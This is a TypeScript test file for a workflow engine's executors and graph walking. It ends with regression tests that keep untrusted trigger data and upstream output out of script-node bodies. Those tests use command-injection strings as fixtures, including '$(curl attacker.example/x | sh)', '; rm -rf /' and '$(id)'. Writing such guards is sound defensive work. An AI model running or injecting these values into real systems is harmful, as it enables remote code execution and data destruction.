import { afterAll, beforeAll, describe, expect, test } from "bun:test";
import { unlink } from "node:fs/promises";
import { z } from "zod";
import {
  closeDb,
  createWorkflow,
  deleteWorkflow,
  getWorkflowRun,
  getWorkflowRunStepsByRunId,
  initDb,
} from "../be/db";
import type { Workflow, WorkflowDefinition } from "../types";
import { shouldSkipCooldown } from "../workflows/cooldown";
import {
  findReadyNodes,
  interpolateNodeConfig,
  startWorkflowExecution,
  walkGraph,
} from "../workflows/engine";
import {
  BaseExecutor,
  type ExecutorDependencies,
  type ExecutorResult,
} from "../workflows/executors/base";
import { ExecutorRegistry } from "../workflows/executors/registry";
import { ScriptExecutor } from "../workflows/executors/script";
import { resolveInputs } from "../workflows/input";
import { SKIP_SANDBOX_SPAWN_TESTS } from "./sandbox-spawn-test-helpers";

const skip = test.skipIf(SKIP_SANDBOX_SPAWN_TESTS);

const TEST_DB_PATH = "./test-workflow-engine-v2.sqlite";

// ─── Test Executors ──────────────────────────────────────────

class EchoExecutor extends BaseExecutor<typeof EchoExecutor.schema, typeof EchoExecutor.outSchema> {
  static readonly schema = z.object({ message: z.string() });
  static readonly outSchema = z.object({ echo: z.string() });

  readonly type = "echo";
  readonly mode = "instant" as const;
  readonly configSchema = EchoExecutor.schema;
  readonly outputSchema = EchoExecutor.outSchema;

  protected async execute(
    config: z.infer<typeof EchoExecutor.schema>,
  ): Promise<ExecutorResult<z.infer<typeof EchoExecutor.outSchema>>> {
    return { status: "success", output: { echo: config.message } };
  }
}

class CounterExecutor extends BaseExecutor<
  typeof CounterExecutor.schema,
  typeof CounterExecutor.outSchema
> {
  static readonly schema = z.object({ value: z.number() });
  static readonly outSchema = z.object({ doubled: z.number() });

  readonly type = "counter";
  readonly mode = "instant" as const;
  readonly configSchema = CounterExecutor.schema;
  readonly outputSchema = CounterExecutor.outSchema;

  protected async execute(
    config: z.infer<typeof CounterExecutor.schema>,
  ): Promise<ExecutorResult<z.infer<typeof CounterExecutor.outSchema>>> {
    return { status: "success", output: { doubled: config.value * 2 } };
  }
}

class BranchExecutor extends BaseExecutor<
  typeof BranchExecutor.schema,
  typeof BranchExecutor.outSchema
> {
  static readonly schema = z.object({
    conditions: z.array(z.object({ field: z.string(), op: z.string(), value: z.unknown() })),
  });
  static readonly outSchema = z.object({ passed: z.boolean() });

  readonly type = "property-match";
  readonly mode = "instant" as const;
  readonly configSchema = BranchExecutor.schema;
  readonly outputSchema = BranchExecutor.outSchema;

  protected async execute(
    config: z.infer<typeof BranchExecutor.schema>,
    context: Readonly<Record<string, unknown>>,
  ): Promise<ExecutorResult<z.infer<typeof BranchExecutor.outSchema>>> {
    // Simple evaluation: check first condition
    const cond = config.conditions[0];
    if (!cond) return { status: "success", output: { passed: true }, nextPort: "true" };

    const fieldPath = cond.field.split(".");
    let value: unknown = context;
    for (const key of fieldPath) {
      if (value == null || typeof value !== "object") {
        value = undefined;
        break;
      }
      value = (value as Record<string, unknown>)[key];
    }

    let passed = false;
    if (cond.op === "eq") passed = value === cond.value;
    if (cond.op === "neq") passed = value !== cond.value;

    return {
      status: "success",
      output: { passed },
      nextPort: passed ? "true" : "false",
    };
  }
}

class SlowExecutor extends BaseExecutor<typeof SlowExecutor.schema, typeof SlowExecutor.outSchema> {
  static readonly schema = z.object({ delayMs: z.number() });
  static readonly outSchema = z.object({ finished: z.boolean() });

  readonly type = "slow";
  readonly mode = "instant" as const;
  readonly configSchema = SlowExecutor.schema;
  readonly outputSchema = SlowExecutor.outSchema;

  protected async execute(
    config: z.infer<typeof SlowExecutor.schema>,
  ): Promise<ExecutorResult<z.infer<typeof SlowExecutor.outSchema>>> {
    await new Promise((resolve) => setTimeout(resolve, config.delayMs));
    return { status: "success", output: { finished: true } };
  }
}

class FailingExecutor extends BaseExecutor<
  typeof FailingExecutor.schema,
  typeof FailingExecutor.outSchema
> {
  static readonly schema = z.object({ errorMsg: z.string().optional() });
  static readonly outSchema = z.object({});

  readonly type = "failing";
  readonly mode = "instant" as const;
  readonly configSchema = FailingExecutor.schema;
  readonly outputSchema = FailingExecutor.outSchema;

  protected async execute(
    config: z.infer<typeof FailingExecutor.schema>,
  ): Promise<ExecutorResult<z.infer<typeof FailingExecutor.outSchema>>> {
    return { status: "failed", error: config.errorMsg || "intentional failure" };
  }
}

class ValidatePassExecutor extends BaseExecutor<
  typeof ValidatePassExecutor.schema,
  typeof ValidatePassExecutor.outSchema
> {
  static readonly schema = z
    .object({
      targetNodeId: z.string(),
    })
    .passthrough();
  static readonly outSchema = z.object({
    pass: z.boolean(),
    reasoning: z.string(),
    confidence: z.number(),
  });

  readonly type = "validate";
  readonly mode = "instant" as const;
  readonly configSchema = ValidatePassExecutor.schema;
  readonly outputSchema = ValidatePassExecutor.outSchema;

  protected async execute(
    config: z.infer<typeof ValidatePassExecutor.schema>,
    _context: Readonly<Record<string, unknown>>,
  ): Promise<ExecutorResult<z.infer<typeof ValidatePassExecutor.outSchema>>> {
    // Check if the config signals this should fail
    const shouldFail = (config as Record<string, unknown>).shouldFail === true;
    return {
      status: "success",
      output: {
        pass: !shouldFail,
        reasoning: shouldFail ? "Forced failure" : "All good",
        confidence: 1.0,
      },
      nextPort: shouldFail ? "fail" : "pass",
    };
  }
}

// ─── Mock Dependencies ───────────────────────────────────────

const mockDeps: ExecutorDependencies = {
  db: {} as typeof import("../be/db"),
  eventBus: { emit: () => {}, on: () => {}, off: () => {} },
  interpolate: (t: string) => t,
};

function createTestRegistry(): ExecutorRegistry {
  const registry = new ExecutorRegistry();
  registry.register(new EchoExecutor(mockDeps));
  registry.register(new CounterExecutor(mockDeps));
  registry.register(new BranchExecutor(mockDeps));
  registry.register(new SlowExecutor(mockDeps));
  registry.register(new FailingExecutor(mockDeps));
  registry.register(new ValidatePassExecutor(mockDeps));
  return registry;
}

let workflowCounter = 0;
const createdWorkflowIds: string[] = [];

/** Create a workflow persisted to the test DB */
async function makeWorkflow(
  def: WorkflowDefinition,
  overrides?: Partial<Workflow>,
): Promise<Workflow> {
  workflowCounter++;
  const workflow = await createWorkflow({
    name: overrides?.name || `test-workflow-${workflowCounter}-${Date.now()}`,
    definition: def,
    triggers: overrides?.triggers,
    cooldown: overrides?.cooldown,
    input: overrides?.input,
  });
  // Track for cleanup
  createdWorkflowIds.push(workflow.id);
  return { ...workflow, ...overrides };
}

// ─── Tests ───────────────────────────────────────────────────

describe("Workflow Engine v2 (Phase 3)", () => {
  beforeAll(async () => {
    try {
      await unlink(TEST_DB_PATH);
    } catch {
      // File doesn't exist
    }
    initDb(TEST_DB_PATH);
  });

  afterAll(async () => {
    // Clean up created workflows
    for (const id of createdWorkflowIds) {
      try {
        await deleteWorkflow(id);
      } catch {
        // Already deleted
      }
    }
    closeDb();
    try {
      await unlink(TEST_DB_PATH);
      await unlink(`${TEST_DB_PATH}-wal`);
      await unlink(`${TEST_DB_PATH}-shm`);
    } catch {
      // Files may not exist
    }
  });

  // ─── Linear Workflow ──────────────────────────────────────

  describe("Linear workflow execution", () => {
    test("executes 3 instant nodes to completion, context accumulates", async () => {
      const registry = createTestRegistry();
      const def: WorkflowDefinition = {
        nodes: [
          { id: "step1", type: "echo", config: { message: "hello" }, next: "step2" },
          { id: "step2", type: "echo", config: { message: "world" }, next: "step3" },
          { id: "step3", type: "echo", config: { message: "done" } },
        ],
      };

      const workflow = await makeWorkflow(def);
      const runId = await startWorkflowExecution(workflow, { test: true }, registry);

      const run = await getWorkflowRun(runId);
      expect(run).not.toBeNull();
      expect(run!.status).toBe("completed");

      // Verify context accumulated
      expect(run!.context).toBeDefined();
      const ctx = run!.context as Record<string, unknown>;
      expect(ctx.step1).toEqual({ echo: "hello" });
      expect(ctx.step2).toEqual({ echo: "world" });
      expect(ctx.step3).toEqual({ echo: "done" });

      // Verify 3 steps created
      const steps = await getWorkflowRunStepsByRunId(runId);
      expect(steps).toHaveLength(3);
      expect(steps.every((s) => s.status === "completed")).toBe(true);
    });
  });

  // ─── Branching Workflow ───────────────────────────────────

  describe("Branching workflow", () => {
    test("follows true port on property-match", async () => {
      const registry = createTestRegistry();
      const def: WorkflowDefinition = {
        nodes: [
          { id: "start", type: "echo", config: { message: "data" }, next: "check" },
          {
            id: "check",
            type: "property-match",
            config: {
              conditions: [{ field: "start.echo", op: "eq", value: "data" }],
            },
            next: { true: "ok", false: "notok" },
          },
          { id: "ok", type: "echo", config: { message: "passed" } },
          { id: "notok", type: "echo", config: { message: "failed" } },
        ],
      };

      const workflow = await makeWorkflow(def);
      const runId = await startWorkflowExecution(workflow, {}, registry);

      const run = await getWorkflowRun(runId);
      expect(run!.status).toBe("completed");

      const steps = await getWorkflowRunStepsByRunId(runId);
      const stepNodeIds = steps.map((s) => s.nodeId);
      expect(stepNodeIds).toContain("start");
      expect(stepNodeIds).toContain("check");
      expect(stepNodeIds).toContain("ok");
      expect(stepNodeIds).not.toContain("notok");
    });

    test("follows false port on property-match", async () => {
      const registry = createTestRegistry();
      const def: WorkflowDefinition = {
        nodes: [
          { id: "start", type: "echo", config: { message: "data" }, next: "check" },
          {
            id: "check",
            type: "property-match",
            config: {
              conditions: [{ field: "start.echo", op: "eq", value: "different" }],
            },
            next: { true: "ok", false: "notok" },
          },
          { id: "ok", type: "echo", config: { message: "passed" } },
          { id: "notok", type: "echo", config: { message: "failed" } },
        ],
      };

      const workflow = await makeWorkflow(def);
      const runId = await startWorkflowExecution(workflow, {}, registry);

      const run = await getWorkflowRun(runId);
      expect(run!.status).toBe("completed");

      const steps = await getWorkflowRunStepsByRunId(runId);
      const stepNodeIds = steps.map((s) => s.nodeId);
      expect(stepNodeIds).toContain("notok");
      expect(stepNodeIds).not.toContain("ok");
    });
  });

  // ─── Memoization ──────────────────────────────────────────

  describe("Memoization (idempotency)", () => {
    test("re-walking with completed steps skips them", async () => {
      const registry = createTestRegistry();
      const def: WorkflowDefinition = {
        nodes: [
          { id: "a", type: "echo", config: { message: "first" }, next: "b" },
          { id: "b", type: "echo", config: { message: "second" } },
        ],
      };

      // Execute the workflow fully first
      const workflow = await makeWorkflow(def);
      const runId = await startWorkflowExecution(workflow, {}, registry);

      const run = await getWorkflowRun(runId);
      expect(run!.status).toBe("completed");

      // Now walk the graph again with the same runId — steps should be skipped
      const ctx: Record<string, unknown> = { trigger: {} };
      const entryNodes = def.nodes.filter((n) => n.id === "a");
      await walkGraph(def, runId, ctx, entryNodes, registry, workflow.id);

      // Should still have only 2 steps (no duplicates)
      const steps = await getWorkflowRunStepsByRunId(runId);
      expect(steps).toHaveLength(2);

      // Context should be re-populated from stored outputs
      expect(ctx.a).toEqual({ echo: "first" });
      expect(ctx.b).toEqual({ echo: "second" });
    });
  });

  // ─── Timeout ──────────────────────────────────────────────

  describe("Timeout", () => {
    test("step fails when executor exceeds timeout", async () => {
      const registry = createTestRegistry();
      const def: WorkflowDefinition = {
        nodes: [
          // 2s delay should exceed the 500ms timeout
          { id: "slow", type: "slow", config: { delayMs: 2_000, timeoutMs: 500 } },
        ],
      };

      const workflow = await makeWorkflow(def);
      const runId = await startWorkflowExecution(workflow, {}, registry);

      const run = await getWorkflowRun(runId);
      expect(run!.status).toBe("failed");
      expect(run!.error).toContain("timed out");
    }, 5_000); // Allow test up to 5s

    // The inline runtime's ulimit preamble fails on macOS (no usable
    // RLIMIT_AS), so the script dies before the watchdog behavior under test.
    // Linux CI is the enforcing environment; the skip only unblocks local
    // macOS pushes now that pre-push tests are blocking (#1216).
    test.skipIf(process.platform === "darwin" || SKIP_SANDBOX_SPAWN_TESTS)(
      "inline script timeout also extends the workflow step watchdog",
      async () => {
        const registry = createTestRegistry();
        registry.register(new ScriptExecutor(mockDeps));
        const def: WorkflowDefinition = {
          nodes: [
            {
              id: "slow-script",
              type: "script",
              config: {
                runtime: "bash",
                script: "sleep 0.075; echo done",
                timeout: 1_000,
              },
            },
          ],
        };

        const workflow = await makeWorkflow(def);
        const runId = await startWorkflowExecution(workflow, {}, registry);

        const run = await getWorkflowRun(runId);
        expect(run!.status).toBe("completed");
        expect((await getWorkflowRunStepsByRunId(runId))[0]?.output).toMatchObject({
          stdout: "done",
        });
      },
    );
  });

  // ─── Validation ───────────────────────────────────────────

  describe("Validation", () => {
    test("validation pass allows step to complete", async () => {
      const registry = createTestRegistry();
      const def: WorkflowDefinition = {
        nodes: [
          {
            id: "step1",
            type: "echo",
            config: { message: "validated" },
            validation: {
              executor: "validate",
              config: { shouldFail: false },
              mustPass: true,
            },
            next: "step2",
          },
          { id: "step2", type: "echo", config: { message: "after" } },
        ],
      };

      const workflow = await makeWorkflow(def);
      const runId = await startWorkflowExecution(workflow, {}, registry);

      const run = await getWorkflowRun(runId);
      expect(run!.status).toBe("completed");

      const steps = await getWorkflowRunStepsByRunId(runId);
      expect(steps).toHaveLength(2);
    });

    test("validation halt (mustPass) fails the run when all branches fail", async () => {
      const registry = createTestRegistry();
      const def: WorkflowDefinition = {
        nodes: [
          {
            id: "step1",
            type: "echo",
            config: { message: "will fail validation" },
            validation: {
              executor: "validate",
              config: { shouldFail: true },
              mustPass: true,
            },
            next: "step2",
          },
          { id: "step2", type: "echo", config: { message: "never reached" } },
        ],
      };

      const workflow = await makeWorkflow(def);
      const runId = await startWorkflowExecution(workflow, {}, registry);

      const run = await getWorkflowRun(runId);
      expect(run!.status).toBe("failed");
      expect(run!.error).toContain("Failed nodes: step1");

      const steps = await getWorkflowRunStepsByRunId(runId);
      const nodeIds = steps.map((s) => s.nodeId);
      expect(nodeIds).not.toContain("step2");
    });

    test("linear workflow: mustPass failure on non-entry node marks run as failed", async () => {
      // Regression: when the failing mustPass node is NOT the entry node, the
      // entry node's "completed" status must not count toward hasCompletedSteps,
      // otherwise the run is incorrectly marked as partial-failure instead of failed.
      const registry = createTestRegistry();
      const def: WorkflowDefinition = {
        nodes: [
          {
            id: "trigger",
            type: "echo",
            config: { message: "entry node completes" },
            next: "validator",
          },
          {
            id: "validator",
            type: "echo",
            config: { message: "will fail validation" },
            validation: {
              executor: "validate",
              config: { shouldFail: true },
              mustPass: true,
            },
            next: "action",
          },
          { id: "action", type: "echo", config: { message: "never reached" } },
        ],
      };

      const workflow = await makeWorkflow(def);
      const runId = await startWorkflowExecution(workflow, {}, registry);

      const run = await getWorkflowRun(runId);
      // Run should be failed — the only non-entry completed step is none
      expect(run!.status).toBe("failed");
      expect(run!.error).toContain("Failed nodes: validator");

      const steps = await getWorkflowRunStepsByRunId(runId);
      const nodeIds = steps.map((s) => s.nodeId);
      expect(nodeIds).toContain("trigger");
      expect(nodeIds).toContain("validator");
      expect(nodeIds).not.toContain("action");
    });

    test("mustPass failure cancels only the failed branch, not parallel branches", async () => {
      const registry = createTestRegistry();
      const def: WorkflowDefinition = {
        nodes: [
          {
            id: "start",
            type: "echo",
            config: { message: "begin" },
            next: ["branchA", "branchB"],
          },
          {
            id: "branchA",
            type: "echo",
            config: { message: "branch A will fail validation" },
            validation: {
              executor: "validate",
              config: { shouldFail: true },
              mustPass: true,
            },
            next: "afterA",
          },
          { id: "afterA", type: "echo", config: { message: "after A — should NOT execute" } },
          {
            id: "branchB",
            type: "echo",
            config: { message: "branch B succeeds" },
            next: "afterB",
          },
          { id: "afterB", type: "echo", config: { message: "after B — should execute" } },
        ],
      };

      const workflow = await makeWorkflow(def);
      const runId = await startWorkflowExecution(workflow, {}, registry);

      const run = await getWorkflowRun(runId);
      // Run should complete (not fail) because branchB succeeded
      expect(run!.status).toBe("completed");
      // Should note partial failure
      expect(run!.error).toContain("Partial failure");
      expect(run!.error).toContain("branchA");

      const steps = await getWorkflowRunStepsByRunId(runId);
      const nodeIds = steps.map((s) => s.nodeId);
      // branchA's successor should NOT have executed
      expect(nodeIds).not.toContain("afterA");
      // branchB's successor SHOULD have executed
      expect(nodeIds).toContain("afterB");
      // branchA step should be marked as failed
      const branchAStep = steps.find((s) => s.nodeId === "branchA");
      expect(branchAStep!.status).toBe("failed");
    });

    test("validation failure without mustPass is advisory (allows completion)", async () => {
      const registry = createTestRegistry();
      const def: WorkflowDefinition = {
        nodes: [
          {
            id: "step1",
            type: "echo",
            config: { message: "advisory" },
            validation: {
              executor: "validate",
              config: { shouldFail: true },
              mustPass: false,
            },
            next: "step2",
          },
          { id: "step2", type: "echo", config: { message: "reached" } },
        ],
      };

      const workflow = await makeWorkflow(def);
      const runId = await startWorkflowExecution(workflow, {}, registry);

      const run = await getWorkflowRun(runId);
      expect(run!.status).toBe("completed");

      const steps = await getWorkflowRunStepsByRunId(runId);
      expect(steps).toHaveLength(2);
    });
  });

  // ─── Cooldown ─────────────────────────────────────────────

  describe("Cooldown", () => {
    test("shouldSkipCooldown returns true within cooldown window", async () => {
      const { createWorkflowRun, updateWorkflowRun } = await import("../be/db");
      const def: WorkflowDefinition = {
        nodes: [{ id: "a", type: "echo", config: {} }],
      };
      const workflow = await makeWorkflow(def, { cooldown: { hours: 1 } });

      // Create a successful run that just finished
      const runId = crypto.randomUUID();
      await createWorkflowRun({ id: runId, workflowId: workflow.id });
      await updateWorkflowRun(runId, {
        status: "completed",
        finishedAt: new Date().toISOString(),
      });

      // Should skip — within 1 hour cooldown
      const skip = await shouldSkipCooldown(workflow.id, { hours: 1 });
      expect(skip).toBe(true);

      // Should not skip — with 0 second cooldown
      const noSkip = await shouldSkipCooldown(workflow.id, { seconds: 0 });
      expect(noSkip).toBe(false);
    });

    test("startWorkflowExecution creates skipped run on cooldown", async () => {
      const registry = createTestRegistry();
      const def: WorkflowDefinition = {
        nodes: [{ id: "a", type: "echo", config: { message: "hi" } }],
      };
      const workflow = await makeWorkflow(def, { cooldown: { hours: 1 } });

      // Run the workflow once (should succeed)
      const run1Id = await startWorkflowExecution(workflow, {}, registry);
      const run1 = await getWorkflowRun(run1Id);
      expect(run1!.status).toBe("completed");

      // Run again — should be skipped due to cooldown
      const run2Id = await startWorkflowExecution(workflow, {}, registry);
      const run2 = await getWorkflowRun(run2Id);
      expect(run2!.status).toBe("skipped");
      expect(run2!.error).toBe("cooldown");
    });
  });

  // ─── Input Resolution ─────────────────────────────────────

  describe("Input resolution", () => {
    test("resolves environment variables", async () => {
      process.env.TEST_WORKFLOW_VAR = "resolved_value";
      // biome-ignore lint/suspicious/noTemplateCurlyInString: testing env var syntax
      const result = await resolveInputs({ myVar: "${TEST_WORKFLOW_VAR}" });
      expect(result.myVar).toBe("resolved_value");
      delete process.env.TEST_WORKFLOW_VAR;
    });

    test("passes through literal strings", async () => {
      const result = await resolveInputs({ name: "literal value" });
      expect(result.name).toBe("literal value");
    });

    test("throws on missing environment variable", async () => {
      // biome-ignore lint/suspicious/noTemplateCurlyInString: testing env var syntax
      await expect(resolveInputs({ bad: "${NONEXISTENT_WORKFLOW_VAR_12345}" })).rejects.toThrow(
        "not set",
      );
    });
  });

  // ─── findReadyNodes ───────────────────────────────────────

  describe("findReadyNodes", () => {
    test("entry nodes are ready when nothing is completed", () => {
      const def: WorkflowDefinition = {
        nodes: [
          { id: "a", type: "echo", config: {}, next: "b" },
          { id: "b", type: "echo", config: {} },
        ],
      };
      const ready = findReadyNodes(def, new Set());
      expect(ready).toHaveLength(1);
      expect(ready[0].id).toBe("a");
    });

    test("successor is ready when predecessor is completed", () => {
      const def: WorkflowDefinition = {
        nodes: [
          { id: "a", type: "echo", config: {}, next: "b" },
          { id: "b", type: "echo", config: {}, next: "c" },
          { id: "c", type: "echo", config: {} },
        ],
      };
      const ready = findReadyNodes(def, new Set(["a"]));
      expect(ready).toHaveLength(1);
      expect(ready[0].id).toBe("b");
    });

    test("convergence node waits for all predecessors", () => {
      const def: WorkflowDefinition = {
        nodes: [
          { id: "a", type: "echo", config: {}, next: { x: "b", y: "c" } },
          { id: "b", type: "echo", config: {}, next: "d" },
          { id: "c", type: "echo", config: {}, next: "d" },
          { id: "d", type: "echo", config: {} },
        ],
      };

      // Only a and b completed — d should NOT be ready (c not done)
      const ready1 = findReadyNodes(def, new Set(["a", "b"]));
      expect(ready1.map((n) => n.id)).toContain("c");
      expect(ready1.map((n) => n.id)).not.toContain("d");

      // a, b, and c completed — d should be ready
      const ready2 = findReadyNodes(def, new Set(["a", "b", "c"]));
      expect(ready2).toHaveLength(1);
      expect(ready2[0].id).toBe("d");
    });

    test("returns empty when all nodes completed", () => {
      const def: WorkflowDefinition = {
        nodes: [
          { id: "a", type: "echo", config: {}, next: "b" },
          { id: "b", type: "echo", config: {} },
        ],
      };
      const ready = findReadyNodes(def, new Set(["a", "b"]));
      expect(ready).toHaveLength(0);
    });
  });

  // ─── Failure Handling ─────────────────────────────────────

  describe("Step failure", () => {
    test("failing executor marks run as failed", async () => {
      const registry = createTestRegistry();
      const def: WorkflowDefinition = {
        nodes: [{ id: "fail", type: "failing", config: { errorMsg: "boom" } }],
      };

      const workflow = await makeWorkflow(def);
      const runId = await startWorkflowExecution(workflow, {}, registry);

      const run = await getWorkflowRun(runId);
      expect(run!.status).toBe("failed");
      expect(run!.error).toContain("boom");
    });

    test("failure stops downstream execution", async () => {
      const registry = createTestRegistry();
      const def: WorkflowDefinition = {
        nodes: [
          { id: "fail", type: "failing", config: { errorMsg: "early fail" }, next: "after" },
          { id: "after", type: "echo", config: { message: "unreachable" } },
        ],
      };

      const workflow = await makeWorkflow(def);
      const runId = await startWorkflowExecution(workflow, {}, registry);

      const run = await getWorkflowRun(runId);
      expect(run!.status).toBe("failed");

      const steps = await getWorkflowRunStepsByRunId(runId);
      const nodeIds = steps.map((s) => s.nodeId);
      expect(nodeIds).not.toContain("after");
    });

    test("unresolved inline script-body tokens fail with the node and token named", async () => {
      const registry = createTestRegistry();
      registry.register(new ScriptExecutor(mockDeps));
      const workflow = await makeWorkflow({
        nodes: [
          {
            id: "unsafe-script",
            type: "script",
            config: { runtime: "bash", script: "echo {{trigger.payload}}" },
          },
        ],
      });

      const runId = await startWorkflowExecution(workflow, { payload: "attacker-data" }, registry);
      const run = await getWorkflowRun(runId);
      const [step] = await getWorkflowRunStepsByRunId(runId);

      expect(run?.status).toBe("failed");
      expect(run?.error).toContain('node "unsafe-script"');
      expect(run?.error).toContain("{{trigger.payload}}");
      expect(run?.error).toContain("config.args");
      expect(step?.status).toBe("failed");
      expect(step?.error).toContain("{{trigger.payload}}");
      expect(step?.retryCount).toBe(0);
      expect(step?.output).toBeUndefined();
    });

    skip("bundled ralph-loop scripts execute with trigger and upstream values passed as args", async () => {
      const receipt = (await Bun.file(
        new URL("../../docs-site/public/receipts/workflows/ralph-loop.json", import.meta.url),
      ).json()) as { definition: WorkflowDefinition };
      const receiptNode = (id: string) => {
        const node = receipt.definition.nodes.find((candidate) => candidate.id === id);
        if (!node) throw new Error(`Missing ${id} in bundled ralph-loop receipt`);
        return node;
      };

      const registry = createTestRegistry();
      registry.register(new ScriptExecutor(mockDeps));
      const workflow = await makeWorkflow({
        nodes: [
          { ...receiptNode("validate-trigger"), next: "ralph-iteration" },
          {
            id: "ralph-iteration",
            type: "script",
            config: {
              runtime: "bash",
              script: `jq -n '{taskOutput:{iteration:1}}'`,
            },
            next: "max-check",
          },
          { ...receiptNode("max-check"), next: undefined },
        ],
      });

      const runId = await startWorkflowExecution(
        workflow,
        { goal: "ship safely", maxIterations: 3 },
        registry,
      );
      const run = await getWorkflowRun(runId);
      const steps = await getWorkflowRunStepsByRunId(runId);

      expect(run?.status).toBe("completed");
      expect(steps.map((step) => [step.nodeId, step.status])).toEqual([
        ["validate-trigger", "completed"],
        ["ralph-iteration", "completed"],
        ["max-check", "completed"],
      ]);
      expect(run?.context).toMatchObject({
        "validate-trigger": { ok: true, goal: "ship safely", maxIterations: 3 },
        "max-check": { atMax: false, iteration: 1, max: 3 },
      });
    });
  });

  // ─── Context Interpolation ────────────────────────────────

  describe("Context interpolation", () => {
    test("config values are interpolated from context", async () => {
      const registry = createTestRegistry();
      const def: WorkflowDefinition = {
        nodes: [
          { id: "first", type: "echo", config: { message: "hello" }, next: "second" },
          {
            id: "second",
            type: "echo",
            inputs: { firstEcho: "first.echo" },
            config: { message: "got: {{firstEcho}}" },
          },
        ],
      };

      const workflow = await makeWorkflow(def);
      const runId = await startWorkflowExecution(workflow, {}, registry);

      const run = await getWorkflowRun(runId);
      expect(run!.status).toBe("completed");
      expect((run!.context as Record<string, unknown>).second).toEqual({
        echo: "got: hello",
      });
    });
  });
});

// ─── interpolateNodeConfig: script-node trigger-data injection guard ─────
// (superagent.sh report c27edfd7, finding b132d7c5 — untrusted trigger data
// interpolated into an unsandboxed workflow script node)

describe("interpolateNodeConfig — script node", () => {
  test("trigger data is NOT substituted into `config.script` (stays a literal, unresolved token)", () => {
    const node = {
      type: "script",
      config: {
        runtime: "bash",
        script: "echo {{trigger.payload}}",
      },
    };
    const ctx = { trigger: { payload: "$(curl attacker.example/x | sh)" } };

    const { value, unresolved } = interpolateNodeConfig(node, ctx);

    const script = (value as { script: string }).script;
    expect(script).not.toContain("curl attacker.example");
    expect(script).toBe("echo {{trigger.payload}}");
    expect(unresolved).toContain("trigger.payload");
  });

  test("input/workflow/swarm/run data (operator- or system-authored) is still interpolated into the script", () => {
    const node = {
      type: "script",
      config: { runtime: "bash", script: "echo {{input.greeting}}" },
    };
    const ctx = { input: { greeting: "hello" }, trigger: { payload: "ignored" } };

    const { value, unresolved } = interpolateNodeConfig(node, ctx);

    expect((value as { script: string }).script).toBe("echo hello");
    expect(unresolved).toEqual([]);
  });

  test("trigger data remains available on other config fields (e.g. args), just not `script`", () => {
    const node = {
      type: "script",
      config: {
        runtime: "bash",
        script: "echo hi",
        args: ["{{trigger.id}}"],
      },
    };
    const ctx = { trigger: { id: "abc-123" } };

    const { value } = interpolateNodeConfig(node, ctx);

    expect((value as { script: string }).script).toBe("echo hi");
    expect((value as { args: string[] }).args).toEqual(["abc-123"]);
  });

  test("non-script node types are unaffected (trigger still interpolates normally)", () => {
    const node = { type: "notify", config: { template: "hi {{trigger.name}}" } };
    const ctx = { trigger: { name: "world" } };

    const { value } = interpolateNodeConfig(node, ctx);

    expect((value as { template: string }).template).toBe("hi world");
  });

  // A declared `inputs` alias is resolved by buildNodeInterpolationCtx BEFORE
  // interpolateNodeConfig runs, so excluding only the literal `trigger` key
  // left this path open (Reviewer finding on PR #1112).
  test("an inputs alias POINTING AT trigger data is excluded from the script body", () => {
    const node = {
      type: "script",
      inputs: { payload: "trigger.payload" },
      config: { runtime: "bash", script: "echo {{payload}}" },
    };
    // The ctx buildNodeInterpolationCtx would produce for that node.
    const ctx = {
      trigger: { payload: "$(curl attacker.example/x | sh)" },
      payload: "$(curl attacker.example/x | sh)",
    };

    const { value, unresolved } = interpolateNodeConfig(node, ctx);

    const script = (value as { script: string }).script;
    expect(script).not.toContain("curl attacker.example");
    expect(script).toBe("echo {{payload}}");
    expect(unresolved).toContain("payload");
  });

  test("an alias that SHADOWS a builtin name but points at trigger data is excluded", () => {
    const node = {
      type: "script",
      inputs: { input: "trigger.body" },
      config: { runtime: "bash", script: "echo {{input}}" },
    };
    const ctx = { trigger: { body: "; rm -rf /" }, input: "; rm -rf /" };

    const { value } = interpolateNodeConfig(node, ctx);

    expect((value as { script: string }).script).toBe("echo {{input}}");
  });

  test("an inputs alias pointing at workflow input is still interpolated into the script", () => {
    const node = {
      type: "script",
      inputs: { token: "input.API_TOKEN" },
      config: { runtime: "bash", script: "curl -H 'Authorization: {{token}}' https://x" },
    };
    const ctx = { input: { API_TOKEN: "tok-123" }, token: "tok-123" };

    const { value, unresolved } = interpolateNodeConfig(node, ctx);

    expect((value as { script: string }).script).toBe("curl -H 'Authorization: tok-123' https://x");
    expect(unresolved).toEqual([]);
  });

  test("upstream node output is excluded from the script body (LLM/script-generated text)", () => {
    const node = {
      type: "script",
      config: { runtime: "bash", script: "echo {{fetchStep.stdout}}" },
    };
    const ctx = { fetchStep: { stdout: "$(id)" } };

    const { value, unresolved } = interpolateNodeConfig(node, ctx);

    expect((value as { script: string }).script).toBe("echo {{fetchStep.stdout}}");
    expect(unresolved).toContain("fetchStep.stdout");
  });

  test("an inputs alias pointing at an upstream node output is excluded too", () => {
    const node = {
      type: "script",
      inputs: { prev: "fetchStep.stdout" },
      config: { runtime: "bash", script: "echo {{prev}}" },
    };
    const ctx = { fetchStep: { stdout: "$(id)" }, prev: "$(id)" };

    const { value } = interpolateNodeConfig(node, ctx);

    expect((value as { script: string }).script).toBe("echo {{prev}}");
  });
});
